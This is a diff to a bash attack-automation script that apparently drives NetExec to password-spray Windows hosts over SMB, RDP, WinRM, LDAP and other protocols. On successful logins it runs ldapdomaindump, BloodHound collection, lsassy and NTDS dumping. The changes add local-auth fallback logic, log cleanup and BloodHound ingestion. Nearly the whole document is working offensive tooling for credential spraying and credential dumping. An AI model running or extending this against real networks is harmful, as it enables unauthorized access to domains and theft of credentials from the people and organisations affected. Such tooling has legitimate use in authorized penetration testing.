@@ -59,6 +59,13 @@ fi
 
 PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "ldap")
 
+supports_local_auth() {
+    case "$1" in
+        smb|winrm|rdp|wmi) return 0 ;;
+        *) return 1 ;;
+    esac
+}
+
 declare -A PROTO_MAP
 for proto in "${PROTOCOLS[@]}"; do
     FILE_PROTO="$OUTDIR/active_$proto.txt"
@@ -83,7 +90,7 @@ get_domain() {
 
     local domain="" hostname="" nxc_out
 
-    echo -e "${GRAY}[CMD] timeout 15s nxc smb \"$ip\" --no-progress (domain detection)${NC}"
+    echo -e "${GRAY}[CMD] timeout 15s nxc smb \"$ip\" --no-progress (domain detection)${NC}" >&2
     nxc_out=$(timeout 15s nxc smb "$ip" --no-progress 2>/dev/null)
     domain=$(echo "$nxc_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)
     hostname=$(echo "$nxc_out" | grep -oP '(?<=\(name:)[^)]+' | head -n1)
@@ -108,12 +115,16 @@ TMP_SUCCESS=".tmp_success_$$"
 # =========================
 for ip in "${!PROTO_MAP[@]}"; do
     echo -e "\n${CYAN}>>> Target Host: $ip${NC}"
-    DOMAIN=$(get_domain "$ip")
+    DOMAIN=$(get_domain "$ip" | tr -d '\r\n' | xargs)
+
+    if [[ "$DOMAIN" =~ \[|\]|CMD ]]; then
+        DOMAIN="."
+    fi
 
     # ===== DOMAIN FALLBACK (IF SMB FAILED) =====
     if [[ "$DOMAIN" == "." ]]; then
-        echo -e "${GRAY}[*] SMB failed to detect domain, trying LDAP fallback...${NC}"
-        echo -e "${GRAY}[CMD] timeout 10s nxc ldap \"$ip\" --no-progress${NC}"
+        echo -e "${GRAY}[*] SMB failed to detect domain, trying LDAP fallback...${NC}" >&2
+        echo -e "${GRAY}[CMD] timeout 10s nxc ldap \"$ip\" --no-progress${NC}" >&2
 
 
         ldap_out=$(timeout 10s nxc ldap "$ip" --no-progress 2>/dev/null)
@@ -143,34 +154,51 @@ for ip in "${!PROTO_MAP[@]}"; do
 
             timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" --continue-on-success --no-progress > "$TMP_RES" 2>&1
 
-            cat "$TMP_RES"
-            sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
-            cat "$TMP_RES" >> "$RAW_OUT"
-            grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
+            TMP_CLEAN="${TMP_RES}.clean"
+
+            sed -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES" \
+                | tee -a "$RAW_OUT" \
+                | tee "$TMP_CLEAN"
+
+            grep -E "\[\+\]|Pwn3d!" "$TMP_CLEAN" > "$TMP_SUCCESS"
+
+            rm -f "$TMP_CLEAN"
 
             [[ -s "$TMP_SUCCESS" ]] && break
 
             if grep -qiE "Broken Pipe|timed out|connection.*timeout" "$TMP_RES"; then
+                echo "$ip" >> "$BROKEN_PIPE_LOG"
                 ((attempt_spray++)); sleep 1
             else
                 break
             fi
         done
 
+       
         # ======================================================
         # STEP 2: LOCAL AUTH FALLBACK
         # ======================================================
-        if [[ ! -s "$TMP_SUCCESS" ]]; then
+
+        if [[ ! -s "$TMP_SUCCESS" ]] && supports_local_auth "$proto"; then
             echo -e "${GRAY}[CMD] fallback --local-auth${NC}"
             echo -e "${GRAY}[CMD] timeout 45s nxc $proto $ip -u $USER_FILE -p $PASS_FILE --local-auth --continue-on-success --no-progress${NC}"
 
-            timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" --local-auth --continue-on-success --no-progress > "$TMP_RES" 2>&1
+            timeout 45s nxc "$proto" "$ip" \
+                -u "$USER_FILE" -p "$PASS_FILE" \
+                --local-auth --continue-on-success --no-progress \
+                > "$TMP_RES" 2>&1   
 
-            cat "$TMP_RES"
-            sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
-            cat "$TMP_RES" >> "$RAW_OUT"
-            grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
+            # ✅ sanitize + log + display
+            sed -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES" \
+                | tee -a "$RAW_OUT" \
+                | tee "$TMP_RES.clean"
+
+            # ✅ extract success
+            grep -E "\[\+\]|Pwn3d!" "$TMP_RES.clean" > "$TMP_SUCCESS"
+
+            rm -f "$TMP_RES.clean"
         fi
+
 
         # ======================================================
         # Falback DOMAIN
@@ -181,9 +209,16 @@ for ip in "${!PROTO_MAP[@]}"; do
 
             timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" -d "$DOMAIN" --continue-on-success --no-progress | tee "$TMP_RES"
 
-            sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
-            cat "$TMP_RES" >> "$RAW_OUT"
-            grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
+            TMP_CLEAN="${TMP_RES}.clean"
+
+            sed -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES" \
+                | tee -a "$RAW_OUT" \
+                | tee "$TMP_CLEAN"
+
+            grep -E "\[\+\]|Pwn3d!" "$TMP_CLEAN" > "$TMP_SUCCESS"
+
+            rm -f "$TMP_CLEAN"
+
 
             [[ -s "$TMP_SUCCESS" ]] && DOMAIN_ARG="-d $DOMAIN"
         fi
@@ -267,13 +302,13 @@ for ip in "${!PROTO_MAP[@]}"; do
 
                 echo "[DEBUG] RAW DOMAIN: $DOMAIN"
                 echo "[DEBUG] RAW USER: $user"
-                echo "[DEBUG] FINAL LDAP_USER: $LDAP_USER"
 
                 LDAP_USER="$user"
 
                 if [[ "$DOMAIN" != "." ]]; then
                     LDAP_USER=$(printf '%s\\%s' "$DOMAIN" "$user")
                 fi
+                echo "[DEBUG] FINAL LDAP_USER: $LDAP_USER"
                 echo -e "${YELLOW}[!] Executing ldapdomaindump...${NC}"
                 echo -e "${GRAY}[CMD] timeout 60s ldapdomaindump \"$ip\" -u \"$LDAP_USER\" -p \"$pass\" -o \"$DUMP_PATH\"${NC}"
                 timeout 60s ldapdomaindump "$ip" -u "$LDAP_USER" -p "$pass" -o "$DUMP_PATH" 
@@ -350,6 +385,19 @@ for ip in "${!PROTO_MAP[@]}"; do
                     fi
                 else
                     timeout 30s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M ntlm_reflection | tee "$TMP_RES"
+                fi
+                # ---------- BLOODHOUND (DOMAIN ONLY) ----------
+                echo "[DEBUG] BH check: DOMAIN=$DOMAIN DC_IP=$dc_ip BH_DONE=${BH_DONE[$DOMAIN]}"
+                if [[ -z "${BH_DONE[$DOMAIN]}" && "$DOMAIN" != "." ]]; then
+                    if mkdir "$OUTDIR/lock_bh_${DOMAIN}" 2>/dev/null; then
+                        BH_DIR="$OUTDIR/bloodhound_${ip}"
+                        mkdir -p "$BH_DIR"
+                        echo -e "${YELLOW}[*] Ingesting AD data via BloodHound...${NC}"
+                        (
+                            cd "$BH_DIR" || exit
+                            timeout 150s bloodhound-ce-python -d "$DOMAIN" -dc "${DC_FQDN_MAP[$DOMAIN]}" -u "$user" -p "$pass" -ns "$dc_ip" -c all --zip | tee bloodhound_run.log
+                        )
+                    fi
                 fi
 
                 # ---------- LSASSY ----------
@@ -486,13 +534,17 @@ if [[ -s "$FINAL_CREDS_FILE" ]]; then
             echo -e "${GRAY}[*] Skipping $ip using $cred_user - NTDS already successfully dumped for this host.${NC}"
             continue
         fi
-        
-        DOMAIN=$(get_domain "$ip")
+    
+        DOMAIN=$(get_domain "$ip" | tr -d '\r\n' | xargs)
+
+        if [[ "$DOMAIN" =~ \[|\]|CMD ]]; then
+            DOMAIN="."
+        fi
 
         # ===== DOMAIN FALLBACK (IF SMB FAILED) =====
         if [[ "$DOMAIN" == "." ]]; then
-            echo -e "${GRAY}[*] SMB failed to detect domain, trying LDAP fallback...${NC}"
-            echo -e "${GRAY}[CMD] timeout 10s nxc ldap \"$ip\" --no-progress${NC}"
+            echo -e "${GRAY}[*] SMB failed to detect domain, trying LDAP fallback...${NC}" >&2
+            echo -e "${GRAY}[CMD] timeout 10s nxc ldap \"$ip\" --no-progress${NC}" >&2
 
             ldap_out=$(timeout 10s nxc ldap "$ip" --no-progress 2>/dev/null)
             ldap_domain=$(echo "$ldap_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)
